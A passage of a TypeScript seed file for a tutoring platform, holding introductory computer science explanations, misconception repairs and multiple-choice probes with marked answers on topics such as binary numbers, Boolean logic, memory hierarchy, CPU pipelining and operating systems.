/**
 * Computer Science Explanation Memory — all 119 canonical CS KG concepts.
 * 4 assets per concept: core_explanation + misconception_repair + mcq + misconception_probe.
 * Seeded via scripts/brain/seed-knowledge-assets.ts.
 */
import { GradeBand, ProbeDifficulty } from '@prisma/client'
import type { SeedExplanation, SeedProbe } from './brainSeedAssets'

// ─── cs.found.intro-computers ────────────────────────────────────────────────
const CSFOUND = 'cs.found.intro-computers'
const CSFOUND_SRC = 'docs/computer-science/kg/graph.json — cs.found.intro-computers'
const CSFOUND_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: CSFOUND, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'A computer is a machine that accepts input, processes it according to a stored program, and produces output. ' +
      'The key word is STORED: unlike a washing machine whose steps are fixed in hardware, a computer\'s program lives in memory and can be replaced — ' +
      'the same physical machine becomes a word processor, a calculator, or a game by loading different software. ' +
      'Every computer, from a phone to a supercomputer, follows this stored-program architecture: ' +
      'input devices (keyboard, camera, microphone) feed data to a processor (CPU) that executes instructions one at a time, using memory to hold data and programs, ' +
      'then sends results to output devices (screen, speaker, printer). ' +
      'Networks allow computers to send and receive data between each other, extending input/output beyond the physical machine.',
    targetedMisconceptions: [],
    source: CSFOUND_SRC,
  },
  {
    conceptId: CSFOUND, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'A common assumption: computers understand what you mean. ' +
      'They do not — computers execute instructions literally and exactly, with no interpretation. ' +
      '"Sort by date" means exactly the operation you coded, not what you intended if your code was wrong. ' +
      'Every bug is evidence that the computer did exactly what it was told; the program\'s intent and its instructions diverged. ' +
      'This is why precision matters in programming: natural language tolerates ambiguity; instruction sets do not.',
    targetedMisconceptions: [`${CSFOUND}:M1`],
    source: CSFOUND_SRC,
  },
]
const CSFOUND_PROBES: SeedProbe[] = [
  {
    conceptId: CSFOUND, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'What distinguishes a stored-program computer from a special-purpose machine like a calculator with fixed functions?',
    choices: [
      { text: 'The program is stored in memory and can be changed, allowing the same hardware to perform different tasks by loading different software', isCorrect: true },
      { text: 'A stored-program computer is faster because it uses special high-speed chips unavailable in calculators', isCorrect: false, misconceptionId: `${CSFOUND}:M2` },
      { text: 'A stored-program computer always connects to the internet, whereas special-purpose machines operate offline', isCorrect: false },
    ],
    correctValue: 'Program in memory — hardware is reprogrammable by loading different software',
    difficulty: ProbeDifficulty.FOUNDATIONAL,
    targetedMisconceptions: [`${CSFOUND}:M2`],
    source: CSFOUND_SRC,
  },
  {
    conceptId: CSFOUND, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'A student writes a sorting program that produces wrong results. They say "the computer misunderstood my instructions." What is the more accurate explanation?',
    choices: [
      { text: 'The computer executed the instructions exactly as written; the error is in the instructions themselves, not the computer\'s interpretation', isCorrect: true },
      { text: 'The computer misinterpreted the intent of the code; modern CPUs sometimes make educated guesses that override the programmer\'s instructions', isCorrect: false, misconceptionId: `${CSFOUND}:M1` },
    ],
    correctValue: 'Computers execute literally — the bug is in the code, not the CPU\'s interpretation',
    difficulty: ProbeDifficulty.FOUNDATIONAL,
    targetedMisconceptions: [`${CSFOUND}:M1`],
    source: CSFOUND_SRC,
  },
]

// ─── cs.found.computer-organisation ──────────────────────────────────────────
const COMPORG = 'cs.found.computer-organisation'
const COMPORG_SRC = 'docs/computer-science/kg/graph.json — cs.found.computer-organisation'
const COMPORG_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: COMPORG, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'Computer organisation describes how the physical components of a computer are connected and work together. ' +
      'The CPU (central processing unit) is the processor — it contains the ALU (arithmetic logic unit, which does calculations and comparisons) ' +
      'and the control unit (which fetches instructions from memory, decodes them, and coordinates execution). ' +
      'Primary memory (RAM) holds currently running programs and their data; it is fast but volatile (lost on power-off). ' +
      'Secondary storage (SSD, HDD) holds programs and files persistently but is slower; the OS loads programs from storage into RAM before the CPU can execute them. ' +
      'The system bus is the set of wires carrying data, addresses, and control signals between CPU, RAM, and I/O devices. ' +
      'The fetch-decode-execute cycle is the CPU\'s heartbeat: fetch the next instruction from RAM, decode what it means, execute it, repeat.',
    targetedMisconceptions: [],
    source: COMPORG_SRC,
  },
  {
    conceptId: COMPORG, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'RAM (memory) and storage (hard drive/SSD) are routinely confused. ' +
      'RAM holds what the computer is USING right now — open programs, the document you\'re editing. ' +
      'Storage holds what you\'ve SAVED — files, installed applications. ' +
      'The distinction matters: installing more RAM speeds up multitasking (more programs in RAM at once); ' +
      'buying more SSD storage gives more space to save files, not faster performance on what is already running. ' +
      'A computer with 8 GB RAM and 1 TB SSD has 8 GB of active workspace and 1 TB of filing cabinet.',
    targetedMisconceptions: [`${COMPORG}:M1`],
    source: COMPORG_SRC,
  },
]
const COMPORG_PROBES: SeedProbe[] = [
  {
    conceptId: COMPORG, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'A computer has 16 GB RAM and a 512 GB SSD. You open a video-editing program and notice it runs slowly. Adding which component would most directly speed up the running program?',
    choices: [
      { text: 'More RAM — the program and its data need to fit in RAM while running; insufficient RAM forces slow swapping to disk', isCorrect: true },
      { text: 'A larger SSD — more storage space means the program has more room to save temporary files', isCorrect: false, misconceptionId: `${COMPORG}:M1` },
      { text: 'A faster network card — video editing requires high-bandwidth data transfer between program components', isCorrect: false },
    ],
    correctValue: 'More RAM — running programs live in RAM, not storage',
    difficulty: ProbeDifficulty.FOUNDATIONAL,
    targetedMisconceptions: [`${COMPORG}:M1`],
    source: COMPORG_SRC,
  },
  {
    conceptId: COMPORG, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'When you save a document, where does it go, and what happens to the copy in RAM when you turn off the computer?',
    choices: [
      { text: 'The saved copy goes to secondary storage (SSD/HDD) and persists; the RAM copy is lost when power is removed because RAM is volatile', isCorrect: true },
      { text: 'Both copies are preserved — RAM keeps its contents even without power, which is why programs reopen where you left them', isCorrect: false, misconceptionId: `${COMPORG}:M1` },
    ],
    correctValue: 'Storage = persistent; RAM = volatile (lost on power-off)',
    difficulty: ProbeDifficulty.FOUNDATIONAL,
    targetedMisconceptions: [`${COMPORG}:M1`],
    source: COMPORG_SRC,
  },
]

// ─── cs.found.number-systems ──────────────────────────────────────────────────
const NUMSYS = 'cs.found.number-systems'
const NUMSYS_SRC = 'docs/computer-science/kg/graph.json — cs.found.number-systems'
const NUMSYS_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: NUMSYS, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'Computers store everything — numbers, text, images, code — as binary: sequences of 0s and 1s. ' +
      'This is because digital circuits have two reliable states (low voltage / high voltage), not ten. ' +
      'Binary (base 2) works exactly like decimal (base 10) but with only two digits: ' +
      'each position is a power of 2 instead of a power of 10. ' +
      '1011₂ = 1×8 + 0×4 + 1×2 + 1×1 = 11₁₀. ' +
      'Hexadecimal (base 16) is a compact human-readable shorthand for binary: one hex digit (0-9, A-F) represents exactly 4 bits. ' +
      '0xFF = 1111 1111₂ = 255₁₀. ' +
      'Octal (base 8) was historically used for older systems. ' +
      'All number systems are different representations of the same underlying quantity — the number does not change, only how we write it.',
    targetedMisconceptions: [],
    source: NUMSYS_SRC,
  },
  {
    conceptId: NUMSYS, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'Students often believe binary numbers are somehow different from "real" numbers. ' +
      '1011₂ and 11₁₀ are the same quantity; only the notation differs. ' +
      'A related error: thinking that larger binary numbers (more digits) are always "bigger." ' +
      '10₂ = 2₁₀ but 11₁₀ = 1011₂ — the 2-digit decimal is larger than the 2-digit binary. ' +
      'Always convert to the same base before comparing magnitude. ' +
      'Also: hexadecimal ≠ "computer numbers" — it is merely shorthand. ' +
      'The computer stores everything in binary; hex is for human convenience when reading memory dumps or colour codes.',
    targetedMisconceptions: [`${NUMSYS}:M1`],
    source: NUMSYS_SRC,
  },
]
const NUMSYS_PROBES: SeedProbe[] = [
  {
    conceptId: NUMSYS, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'Convert 1101₂ to decimal. Show your working.',
    choices: [
      { text: '13 — (1×8) + (1×4) + (0×2) + (1×1) = 13', isCorrect: true },
      { text: '1101 — binary numbers with no zeros represent the same value in decimal', isCorrect: false, misconceptionId: `${NUMSYS}:M1` },
      { text: '7 — adding the four digit values 1+1+0+1 = 3, then multiplied by number of bits 4 ÷ some factor', isCorrect: false },
    ],
    correctValue: '13',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${NUMSYS}:M1`],
    source: NUMSYS_SRC,
  },
  {
    conceptId: NUMSYS, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'Does a computer "think" in binary, or is binary just a way humans describe what the computer does at the circuit level?',
    choices: [
      { text: 'Binary describes the physical circuit states (low/high voltage); the computer itself doesn\'t "think" in any number base — it just switches transistors', isCorrect: true },
      { text: 'The computer thinks in binary — all CPU arithmetic is fundamentally different from decimal arithmetic and produces different results', isCorrect: false, misconceptionId: `${NUMSYS}:M2` },
    ],
    correctValue: 'Binary is a human description of physical switch states, not a distinct kind of arithmetic',
    difficulty: ProbeDifficulty.FOUNDATIONAL,
    targetedMisconceptions: [`${NUMSYS}:M2`],
    source: NUMSYS_SRC,
  },
]

// ─── cs.found.boolean-logic ───────────────────────────────────────────────────
const BOOLLOG = 'cs.found.boolean-logic'
const BOOLLOG_SRC = 'docs/computer-science/kg/graph.json — cs.found.boolean-logic'
const BOOLLOG_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: BOOLLOG, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'Boolean logic operates on two values — TRUE and FALSE (or 1 and 0) — and three fundamental operations: ' +
      'AND (both inputs must be true for the output to be true), ' +
      'OR (at least one input must be true), ' +
      'and NOT (inverts: NOT true = false). ' +
      'These three gates, combined, can implement any logical function and therefore any computation — that is why every CPU is built from billions of transistors acting as logic gates. ' +
      'DeMorgan\'s Laws are essential: NOT(A AND B) = (NOT A) OR (NOT B); NOT(A OR B) = (NOT A) AND (NOT B). ' +
      'In programming, boolean expressions control if-statements and loops: `if age >= 18 AND has_ticket` combines two conditions. ' +
      'Short-circuit evaluation means Python/Java/C stop evaluating as soon as the result is determined: in `A and B`, if A is False, B is never evaluated.',
    targetedMisconceptions: [],
    source: BOOLLOG_SRC,
  },
  {
    conceptId: BOOLLOG, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'A pervasive bug: confusing `and` with `or` in boundary conditions. ' +
      '"Reject if age is below 13 OR above 99" translates to `if age < 13 or age > 99: reject` — correct. ' +
      'Writing `age < 13 and age > 99` is never True (no number is simultaneously below 13 AND above 99) — a logical impossibility. ' +
      'Another trap: `not A and B` means `(not A) and B` — NOT binds tightly. ' +
      'To negate a compound condition, use DeMorgan: `not (A and B)` = `not A or not B`. ' +
      'These errors compile and run silently; only careful logical analysis or test cases with boundary inputs reveal them.',
    targetedMisconceptions: [`${BOOLLOG}:M1`],
    source: BOOLLOG_SRC,
  },
]
const BOOLLOG_PROBES: SeedProbe[] = [
  {
    conceptId: BOOLLOG, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'Apply DeMorgan\'s Law: what is the equivalent of `NOT (sunny AND warm)`?',
    choices: [
      { text: '(NOT sunny) OR (NOT warm) — DeMorgan: NOT(A AND B) = (NOT A) OR (NOT B)', isCorrect: true },
      { text: '(NOT sunny) AND (NOT warm) — NOT distributes inside brackets keeping the same operator', isCorrect: false, misconceptionId: `${BOOLLOG}:M1` },
      { text: 'sunny OR warm — two NOTs cancel and the operator flips', isCorrect: false },
    ],
    correctValue: '(NOT sunny) OR (NOT warm)',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${BOOLLOG}:M1`],
    source: BOOLLOG_SRC,
  },
  {
    conceptId: BOOLLOG, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'A program rejects users if their score is below 40 AND above 90. A student scores 20. Are they rejected?',
    choices: [
      { text: 'No — 20 < 40 is True but 20 > 90 is False, so (True AND False) = False; the condition is never satisfied for any real score', isCorrect: true },
      { text: 'Yes — 20 is below 40, satisfying the first condition, so they are rejected', isCorrect: false, misconceptionId: `${BOOLLOG}:M1` },
    ],
    correctValue: 'No — AND requires BOTH conditions true; no number can be < 40 AND > 90',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${BOOLLOG}:M1`],
    source: BOOLLOG_SRC,
  },
]

// ─── cs.found.memory-storage ──────────────────────────────────────────────────
const MEMSTG = 'cs.found.memory-storage'
const MEMSTG_SRC = 'docs/computer-science/kg/graph.json — cs.found.memory-storage'
const MEMSTG_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: MEMSTG, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'Memory in a computer exists in a hierarchy trading off speed, capacity, and cost: ' +
      'CPU registers (bytes, sub-nanosecond access, most expensive per byte) → ' +
      'cache (L1/L2/L3, kilobytes to megabytes, nanoseconds) → ' +
      'RAM (gigabytes, tens of nanoseconds) → ' +
      'SSD (terabytes, microseconds) → ' +
      'HDD (terabytes, milliseconds for a physical seek). ' +
      'The CPU always operates on data in registers; to access RAM, it issues a load instruction. ' +
      'Cache is automatic hardware that keeps recently used data close to the CPU — a cache hit avoids the slow RAM access. ' +
      'A byte is 8 bits; a kilobyte (KB) is 1,024 bytes; a megabyte (MB) is 1,024 KB; a gigabyte (GB) is 1,024 MB. ' +
      'All storage is measured in units of bits and bytes, regardless of whether it is RAM, SSD, or a network packet.',
    targetedMisconceptions: [],
    source: MEMSTG_SRC,
  },
  {
    conceptId: MEMSTG, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'Students often think "memory" and "storage" are the same thing or interchangeable. ' +
      'They are two separate hardware components with different roles and properties. ' +
      'RAM (memory): fast, volatile, small, used for currently running programs. ' +
      'SSD/HDD (storage): slow, persistent, large, used for files and installed software. ' +
      'A computer with "no storage left" has a full SSD — deleting files frees space. ' +
      'A computer that is "running out of memory" has too little RAM for current tasks — it may swap to disk, slowing to a crawl. ' +
      'These two problems have different solutions: more RAM vs. more SSD, respectively.',
    targetedMisconceptions: [`${MEMSTG}:M1`],
    source: MEMSTG_SRC,
  },
]
const MEMSTG_PROBES: SeedProbe[] = [
  {
    conceptId: MEMSTG, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'In the memory hierarchy, why is cache faster than RAM even though both are semiconductor memory?',
    choices: [
      { text: 'Cache is physically closer to the CPU, uses faster (SRAM) cells, and is much smaller — all reducing access latency', isCorrect: true },
      { text: 'Cache runs at a higher voltage, giving transistors more energy to switch faster', isCorrect: false, misconceptionId: `${MEMSTG}:M2` },
      { text: 'Cache is larger than RAM so the CPU has a better chance of finding what it needs without waiting', isCorrect: false },
    ],
    correctValue: 'Cache: closer + SRAM technology + smaller size → lower latency',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${MEMSTG}:M2`],
    source: MEMSTG_SRC,
  },
  {
    conceptId: MEMSTG, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'A laptop shows "Low disk space" and the user also notices programs running slowly. Are these the same problem?',
    choices: [
      { text: 'No — low disk space means the SSD/HDD is nearly full (a storage problem); slow programs may indicate low RAM causing swapping; these are distinct issues with different fixes', isCorrect: true },
      { text: 'Yes — disk space and RAM are the same resource; when disk fills up, programs slow down because they share the same memory pool', isCorrect: false, misconceptionId: `${MEMSTG}:M1` },
    ],
    correctValue: 'Different problems: disk space = storage; slow programs = likely RAM / swapping',
    difficulty: ProbeDifficulty.FOUNDATIONAL,
    targetedMisconceptions: [`${MEMSTG}:M1`],
    source: MEMSTG_SRC,
  },
]

// ─── cs.found.cpu-architecture ────────────────────────────────────────────────
const CPUARCH = 'cs.found.cpu-architecture'
const CPUARCH_SRC = 'docs/computer-science/kg/graph.json — cs.found.cpu-architecture'
const CPUARCH_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: CPUARCH, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'CPU architecture defines the instruction set and internal organisation of a processor. ' +
      'The Von Neumann architecture stores programs and data in the same memory — the bottleneck between CPU and memory is the "Von Neumann bottleneck." ' +
      'The instruction set architecture (ISA) is the contract between hardware and software: x86-64 (Intel/AMD) and ARM are the dominant ISAs today. ' +
      'Inside the CPU: the ALU executes arithmetic and logic; registers are ultra-fast scratchpads (rax, rbx on x86); ' +
      'the program counter (PC) holds the address of the next instruction; ' +
      'the instruction register (IR) holds the current instruction being decoded. ' +
      'RISC (Reduced Instruction Set Computing) uses simple, fast, uniform instructions (ARM, RISC-V); ' +
      'CISC (Complex Instruction Set Computing) uses fewer, more powerful instructions that each do more work (x86). ' +
      'Modern CPUs achieve performance through pipelining, superscalar execution (multiple pipelines), out-of-order execution, and branch prediction.',
    targetedMisconceptions: [],
    source: CPUARCH_SRC,
  },
  {
    conceptId: CPUARCH, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Clock speed (GHz) is not the same as performance. ' +
      'A 3 GHz CPU executes 3 billion clock cycles per second; how much WORK happens per cycle depends on IPC (instructions per clock). ' +
      'A modern CPU at 3 GHz with IPC = 4 completes more work per second than a 4 GHz CPU with IPC = 1. ' +
      'Furthermore, memory-bound workloads spend most time waiting for RAM, not executing instructions — ' +
      'doubling the clock speed of a memory-bound program gives almost no speedup. ' +
      'This is why measuring performance requires benchmarks on realistic workloads, not just comparing spec-sheet GHz numbers.',
    targetedMisconceptions: [`${CPUARCH}:M1`],
    source: CPUARCH_SRC,
  },
]
const CPUARCH_PROBES: SeedProbe[] = [
  {
    conceptId: CPUARCH, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'The program counter (PC) register holds what information, and why is it updated after every instruction?',
    choices: [
      { text: 'The memory address of the NEXT instruction to execute; it is automatically incremented (or set by branch instructions) so the CPU knows where to fetch from next', isCorrect: true },
      { text: 'The count of instructions executed so far in the current program; it helps the OS measure CPU usage', isCorrect: false, misconceptionId: `${CPUARCH}:M2` },
      { text: 'The current result of the last arithmetic operation; it is updated after each ALU instruction', isCorrect: false },
    ],
    correctValue: 'PC = address of the next instruction — drives the fetch phase of the fetch-decode-execute cycle',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${CPUARCH}:M2`],
    source: CPUARCH_SRC,
  },
  {
    conceptId: CPUARCH, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Laptop A has a 4.5 GHz CPU; Laptop B has a 3.2 GHz CPU. A student concludes Laptop A is always faster. What is missing from this analysis?',
    choices: [
      { text: 'IPC (instructions per clock), core count, cache sizes, and memory bandwidth all affect real-world performance; GHz alone is insufficient for comparison, especially across different architectures', isCorrect: true },
      { text: 'Nothing — clock speed in GHz is the definitive performance metric; higher GHz always means more instructions executed per second', isCorrect: false, misconceptionId: `${CPUARCH}:M1` },
    ],
    correctValue: 'GHz × IPC × cores + memory bandwidth = actual performance; GHz alone is insufficient',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${CPUARCH}:M1`],
    source: CPUARCH_SRC,
  },
]

// ─── cs.found.pipelining-cache ────────────────────────────────────────────────
const PIPELCACHE = 'cs.found.pipelining-cache'
const PIPELCACHE_SRC = 'docs/computer-science/kg/graph.json — cs.found.pipelining-cache'
const PIPELCACHE_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: PIPELCACHE, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Pipelining overlaps the fetch-decode-execute stages of multiple instructions, like an assembly line: ' +
      'while instruction N is being executed, instruction N+1 is being decoded, and N+2 is being fetched. ' +
      'A 5-stage pipeline (IF-ID-EX-MEM-WB) can theoretically produce one instruction result per cycle instead of one per 5 cycles — a 5× throughput gain. ' +
      'Pipeline hazards reduce this gain: data hazards (instruction N+1 needs the result of N not yet written), ' +
      'control hazards (a branch instruction changes the PC; instructions fetched speculatively may be wrong), ' +
      'and structural hazards (two instructions need the same hardware unit simultaneously). ' +
      'Solutions: forwarding (route results directly between pipeline stages), stalling (insert NOP "bubbles"), and branch prediction (guess the branch outcome and flush on mis-prediction). ' +
      'Cache exploits locality: spatial locality (nearby addresses are accessed together — load entire cache lines) and temporal locality (recently accessed data is likely accessed again — keep it in cache).',
    targetedMisconceptions: [],
    source: PIPELCACHE_SRC,
  },
  {
    conceptId: PIPELCACHE, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'A pipeline does not make individual instructions faster — it increases THROUGHPUT (instructions completed per second), not latency (time for one instruction to complete). ' +
      'A single instruction in a 5-stage pipeline still takes 5 cycles to complete, versus 5 cycles without pipelining — no speedup for that instruction. ' +
      'The benefit appears only when many instructions run sequentially: the pipeline stays full, and the average throughput approaches one instruction per cycle. ' +
      'Similarly, a cache hit does not make the CPU calculate faster — it reduces the time the CPU WAITS for data, allowing it to stay busy rather than stalling.',
    targetedMisconceptions: [`${PIPELCACHE}:M1`],
    source: PIPELCACHE_SRC,
  },
]
const PIPELCACHE_PROBES: SeedProbe[] = [
  {
    conceptId: PIPELCACHE, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A branch instruction in a pipeline causes a control hazard. What technique attempts to resolve this without always stalling?',
    choices: [
      { text: 'Branch prediction — the CPU guesses the branch outcome, continues fetching along the predicted path, and flushes the pipeline if the guess is wrong', isCorrect: true },
      { text: 'Data forwarding — the result of the branch is computed before the instruction enters the pipeline using a pre-calculation unit', isCorrect: false, misconceptionId: `${PIPELCACHE}:M2` },
      { text: 'Out-of-order execution — branch instructions are reordered to always execute last, after all other instructions have cleared the pipeline', isCorrect: false },
    ],
    correctValue: 'Branch prediction — speculative execution, flush on mis-predict',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${PIPELCACHE}:M2`],
    source: PIPELCACHE_SRC,
  },
  {
    conceptId: PIPELCACHE, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A 4-stage pipeline processes one instruction. Does the pipeline make this instruction complete in fewer cycles than a non-pipelined CPU?',
    choices: [
      { text: 'No — the single instruction still passes through all 4 stages and takes 4 cycles; pipelining improves throughput for many instructions, not latency for one', isCorrect: true },
      { text: 'Yes — pipelining allows each stage to work simultaneously, reducing the total cycles needed for each instruction', isCorrect: false, misconceptionId: `${PIPELCACHE}:M1` },
    ],
    correctValue: 'Pipelining improves throughput, not single-instruction latency',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${PIPELCACHE}:M1`],
    source: PIPELCACHE_SRC,
  },
]

// ─── cs.found.software-concepts ───────────────────────────────────────────────
const SWCONCEPT = 'cs.found.software-concepts'
const SWCONCEPT_SRC = 'docs/computer-science/kg/graph.json — cs.found.software-concepts'
const SWCONCEPT_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: SWCONCEPT, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'Software is the set of instructions that tells hardware what to do. ' +
      'System software manages the hardware and provides a platform for other programs: the operating system (OS) is the core system software, ' +
      'managing processes, memory, file systems, and device drivers. ' +
      'Application software performs specific user tasks — word processors, browsers, games. ' +
      'Programming languages exist at different levels of abstraction: machine code (raw binary, directly executed by the CPU) → assembly (mnemonic shorthand for machine code, one assembler step away) → ' +
      'high-level languages (Python, Java, C++ — human-readable, require compilation or interpretation). ' +
      'A compiler translates the entire high-level program to machine code before execution; an interpreter translates and executes line by line at runtime. ' +
      'Open-source software distributes its source code publicly; proprietary software does not.',
    targetedMisconceptions: [],
    source: SWCONCEPT_SRC,
  },
  {
    conceptId: SWCONCEPT, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'Compiled languages are not inherently "faster" than interpreted ones — it depends on implementation. ' +
      'Python is interpreted but numpy operations run at C speed because the inner loops are compiled C extensions. ' +
      'Java compiles to bytecode, then the JIT (just-in-time) compiler compiles hotspot bytecode to native machine code at runtime — often as fast as C for long-running programs. ' +
      'JavaScript V8 is aggressively JIT-compiled. ' +
      'The compile/interpret distinction is about the translation strategy, not a guarantee about runtime speed. ' +
      'For most students\' programs the bottleneck is the algorithm, not the language.',
    targetedMisconceptions: [`${SWCONCEPT}:M1`],
    source: SWCONCEPT_SRC,
  },
]
const SWCONCEPT_PROBES: SeedProbe[] = [
  {
    conceptId: SWCONCEPT, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'What is the key difference between a compiler and an interpreter?',
    choices: [
      { text: 'A compiler translates the whole program to machine code before execution; an interpreter translates and executes line by line at runtime', isCorrect: true },
      { text: 'A compiler runs the program immediately; an interpreter first saves a translated file, then runs it later', isCorrect: false, misconceptionId: `${SWCONCEPT}:M2` },
      { text: 'Compilers are used only for low-level languages; interpreters work only with high-level languages', isCorrect: false },
    ],
    correctValue: 'Compiler = full translation before run; interpreter = line-by-line at runtime',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${SWCONCEPT}:M2`],
    source: SWCONCEPT_SRC,
  },
  {
    conceptId: SWCONCEPT, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'Is Python always slower than C for a given task, because C is compiled and Python is interpreted?',
    choices: [
      { text: 'Not always — Python with optimised compiled libraries (numpy, scipy) can match C for numeric tasks; the bottleneck is usually the algorithm, not the language', isCorrect: true },
      { text: 'Yes — compiled languages always produce faster code; an interpreted language can never match compiled performance for any task', isCorrect: false, misconceptionId: `${SWCONCEPT}:M1` },
    ],
    correctValue: 'Language speed depends on implementation and libraries, not compile/interpret alone',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${SWCONCEPT}:M1`],
    source: SWCONCEPT_SRC,
  },
]

// ─── cs.found.os-concepts ─────────────────────────────────────────────────────
const OSCONCEPT = 'cs.found.os-concepts'
const OSCONCEPT_SRC = 'docs/computer-science/kg/graph.json — cs.found.os-concepts'
const OSCONCEPT_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: OSCONCEPT, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'The operating system (OS) is the software layer between hardware and user applications. ' +
      'Its core jobs: process management (creating, scheduling, and terminating programs), ' +
      'memory management (allocating RAM to processes, preventing one process from reading another\'s memory), ' +
      'file system management (organising data on storage into files and directories), ' +
      'device management (communicating with hardware through drivers), ' +
      'and providing a user interface (CLI or GUI). ' +
      'The kernel is the OS\'s core — it runs with full hardware access (privileged/kernel mode). ' +
      'User programs run in user mode with restricted access and make system calls when they need OS services (e.g., writing to a file). ' +
      'This separation protects the system: a buggy application cannot corrupt the OS or other processes.',
    targetedMisconceptions: [],
    source: OSCONCEPT_SRC,
  },
  {
    conceptId: OSCONCEPT, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'The OS is not a program you run — it is what allows programs to run. ' +
      'Every application makes hundreds of OS calls per second: reading a file, drawing a pixel, receiving a network packet — all go through the OS. ' +
      'A related misconception: antivirus software "protects the OS." ' +
      'Antivirus runs as a user-mode application and scans files; it can detect malware but cannot protect against kernel-level rootkits that have already compromised the OS. ' +
      'Security at the OS level requires kernel integrity mechanisms (Secure Boot, integrity measurement) that are enforced before any user-space software loads.',
    targetedMisconceptions: [`${OSCONCEPT}:M1`],
    source: OSCONCEPT_SRC,
  },
]
const OSCONCEPT_PROBES: SeedProbe[] = [
  {
    conceptId: OSCONCEPT, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'A user program wants to write data to a file. It cannot directly write to the disk. What mechanism does it use, and why?',
    choices: [
      { text: 'A system call — the program asks the OS kernel to perform the disk write on its behalf; this keeps disk access controlled and prevents programs from corrupting each other\'s files', isCorrect: true },
      { text: 'It writes directly to the disk using its own disk driver — high-level programs have direct hardware access for performance', isCorrect: false, misconceptionId: `${OSCONCEPT}:M1` },
      { text: 'It sends a request to the antivirus, which checks the data before forwarding it to the OS', isCorrect: false },
    ],
    correctValue: 'System call — kernel mediates all hardware access',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${OSCONCEPT}:M1`],
    source: OSCONCEPT_SRC,
  },
  {
